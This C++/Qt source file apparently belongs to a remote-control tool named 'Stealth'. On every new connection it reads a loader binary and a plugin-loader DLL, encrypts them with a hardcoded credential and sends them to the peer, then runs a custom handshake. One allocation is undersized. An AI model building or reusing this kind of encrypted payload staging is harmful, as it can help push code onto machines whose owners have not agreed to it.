#include "connectionmanager.h"

ConnectionManager::ConnectionManager(Stealth* stealth,MessageManager* mngMessage,QObject* parent) : QObject(parent)
{
    this->mngMessage=mngMessage;
    this->stealth=stealth;

    connect(this,SIGNAL(connectionEstablished(Connection*)),this,SLOT(addConnection(Connection*)));
    connect(mngMessage,SIGNAL(receivedHandshake(Connection*)),this,SLOT(processHandshake(Connection*)));
}

void ConnectionManager::setupConnection(Connection *connection)
{
    if(connection->getState()==Connection::JustConnected)
    {
        connect(connection,SIGNAL(readyRead()),mngMessage,SLOT(readMessage()));

        /* Carga desde el resource
        QFile fileLoader(":/res/loader.bin");
        QFile filePluginLoader(":/res/pluginloader.dll");
        */

        /* Carga desde archivo */
        QFile fileLoader("loader.bin");
        QFile filePluginLoader("pluginloader.dll");

        if(!fileLoader.open(QIODevice::ReadOnly)) return;
        if(!filePluginLoader.open(QIODevice::ReadOnly)) return;

        QByteArray Loader=fileLoader.readAll();
        QByteArray PluginLoader=filePluginLoader.readAll();

        fileLoader.close();
        filePluginLoader.close();

        QByteArray TotalToSend;
        unsigned int datasize=Loader.size()+PluginLoader.size()+4;
        TotalToSend.append((char*)&datasize,4);
        TotalToSend.append(Loader);
        TotalToSend.append(PluginLoader);

        Crypto Crypt1(TotalToSend);
        QByteArray CheckSum=Crypt1.FNV1a(TotalToSend);

        TotalToSend.insert(0,CheckSum);
        Crypt1.setData(TotalToSend);
        //FIXME: Cambiar por password cliente
        QByteArray sha1=Crypt1.sha1(QString("karcrack:1234"));
        QByteArray iv=Crypt1.AES(sha1);

        TotalToSend.clear();
        TotalToSend.append(iv);
        TotalToSend.append(Crypt1.getData());

        connection->write(TotalToSend);
        connection->setIV(iv);

        connection->setState(Connection::WaitingForGreeting);
    }
}

void ConnectionManager::processHandshake(Connection* connection)
{
    //FIXME: Reestablecer a WaitingForGreeting?
    if(connection->getState()!=Connection::ReadingGreeting) return;
    if(connection->Data.size()!=connection->NextBlockHeader.Size.Bytes) return;

    //Guardamos el HandShake
    connection->HandShake=*(Connection::RPEP_SERVER_HANDSHAKE*)connection->Data.data();

    Connection::RPEP_CLIENT_HANDSHAKE* ClientHandShake;

    //FIXME: Definir númro de puertos correcto
#define NUM_PORTS 1

    ClientHandShake=(Connection::RPEP_CLIENT_HANDSHAKE*)malloc(
                sizeof(Connection::RPEP_CLIENT_HANDSHAKE)+sizeof(ushort)*NUM_PORTS
                );

    ClientHandShake->CompressionALGM=connection->HandShake.SupportedCompressionAlgm[0];
    ClientHandShake->MaxBlockSize=connection->HandShake.MaxBlockSize;
    ClientHandShake->Port[0]=2000;
    ClientHandShake->PortCount=NUM_PORTS;
    ClientHandShake->Version.High=1;
    ClientHandShake->Version.Low=0;


    Connection::RPEP_HEADER::_OperationType* Operation=(Connection::RPEP_HEADER::_OperationType*)malloc(sizeof(Connection::RPEP_HEADER::_OperationType*));

    connection->send(Operation,(char*)ClientHandShake,sizeof(Connection::RPEP_CLIENT_HANDSHAKE)+sizeof(ushort)*NUM_PORTS);

    free(ClientHandShake);
    free(Operation);
}

void ConnectionManager::addConnection(Connection* connection)
{
    Connections.append(connection);
}